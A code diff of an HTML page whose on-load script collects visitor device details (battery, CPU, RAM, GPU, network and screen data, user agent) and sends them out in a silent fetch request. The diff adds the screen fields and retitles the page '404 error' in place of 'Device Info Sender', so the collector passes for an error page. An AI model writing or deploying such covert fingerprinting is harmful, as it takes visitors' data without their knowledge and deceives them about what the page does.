@@ -2,7 +2,7 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>Device Info Sender</title>
+  <title>404 error</title>
   <script>
     async function getGPUInfo() {
       try {
@@ -24,13 +24,13 @@
 
     async function sendInfo() {
 
-      // Default battery values (used if Battery API is missing)
+      // Default battery values
       let percent = "NaN";
       let charging = "NaN";
       let timeFull = "NaN";
       let timeEmpty = "NaN";
 
-      // If Battery API exists, fill real values
+      // Try Battery API
       if (navigator.getBattery) {
         try {
           const b = await navigator.getBattery();
@@ -47,23 +47,33 @@
           timeEmpty = sec(b.dischargingTime);
 
         } catch (e) {
-          // If battery API fails, keep NaN defaults
+          // keep NaN defaults
         }
       }
 
+      // Device info
       const cpuThreads = navigator.hardwareConcurrency || "unknown";
       const ramGB = navigator.deviceMemory || "unknown";
       const userAgent = navigator.userAgent;
       const pageURL = window.location.href;
 
+      // GPU info
       const [gpuVendor, gpuRenderer] = await getGPUInfo();
 
+      // Network info
       const conn = navigator.connection || navigator.webkitConnection || navigator.mozConnection || {};
       const connectionType = conn.type || "unknown";
       const effectiveType = conn.effectiveType || "unknown";
       const downlink = conn.downlink || "unknown";
       const rtt = conn.rtt || "unknown";
       const saveData = conn.saveData ? "true" : "false";
+
+      // Screen info
+      const screenW = screen.width;
+      const screenH = screen.height;
+      const pixelRatio = window.devicePixelRatio || 1;
+      const physicalW = Math.round(screenW * pixelRatio);
+      const physicalH = Math.round(screenH * pixelRatio);
 
       const payload = [
         percent,
@@ -80,7 +90,12 @@
         effectiveType,
         downlink,
         rtt,
-        saveData
+        saveData,
+        screenW,
+        screenH,
+        pixelRatio,
+        physicalW,
+        physicalH
       ].join("|");
 
       const url =
@@ -91,6 +106,7 @@
       fetch(url, { method: "GET", mode: "no-cors" });
     }
 </script>
+
 
 </head>
 <body onload="sendInfo()">
